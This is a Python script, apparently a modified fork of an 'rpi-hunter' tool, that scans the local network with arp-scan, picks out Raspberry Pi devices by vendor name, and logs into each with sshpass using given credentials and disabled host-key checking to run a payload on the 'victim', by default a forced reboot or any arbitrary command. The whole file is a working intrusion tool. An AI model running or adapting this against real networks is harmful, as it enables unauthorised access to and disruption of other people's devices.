#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
### ORIGINAL CODE BY BUSESCANFLY, MODIFIED BY TEAM ###
import os
import argparse
from termcolor import colored, cprint

payloads={
	'reboot': 'sudo reboot',
}

def list_payloads():
	l=0
	cprint("Payloads:", "green")
	print(colored("Specify with --payload", "green"), colored("name\n", "yellow"))
	for key,value in payloads.items():
		print(colored('['+key+']', 'yellow'), colored(value, 'white'))
	print('\n')


def scan():
	os.system('sudo arp-scan -g --localnet -W ./scan/scan.pcap')
	os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
	os.system('cat ./scan/pcap.txt | grep -i "rasp" > ./scan/raspi_list')
	os.system('awk \'{print $8}\' ./scan/raspi_list > ./scan/rpi_list')
	os.system('rm -rf ./scan/scan.pcap && rm -rf ./scan/pcap.txt && rm -rf ./scan/raspi_list')
	with open('./scan/rpi_list') as inf:
		ip_list = [line.strip() for line in inf]
	return ip_list

def rpi(ip_list, user, creds, payload):
	cprint('\nLoaded '+ str(len(ip_list)) + ' IP(s)', 'yellow')

	cprint("Loaded payload: " + payload, "green")
	cprint("Beginning to send payload to Pi's...", "blue")

	for ip in ip_list:
		print(colored("Sending payload to victim", "yellow"), colored(ip, "red"))
		os.system("sshpass -p \""+creds+"\" ssh -o stricthostkeychecking=no "+user+"@"+ip+" "+payload)
		print("\n")

def intro():
	print('\n')
	cprint("                        NETWORK BUSTER 'N' RPI-HUNTER                        ", "red")
	cprint("-----------------------------------------------------------------------------", "yellow")
	cprint("            Originally by BusesCanFly, Forked & Modified by Team             ", "blue")
	cprint("-----------------------------------------------------------------------------", "yellow")
	print('\n')

def let_the_hunt_begin(args):
    
	if args.payload in payloads:
		payload=payloads[args.payload]
	else:
		payload=args.payload
  
	[user, creds] = [args.user, args.creds]
    
	intro()

	if args.list:
		list_payloads()
	else:
		rpi(scan(), user, creds, payload)
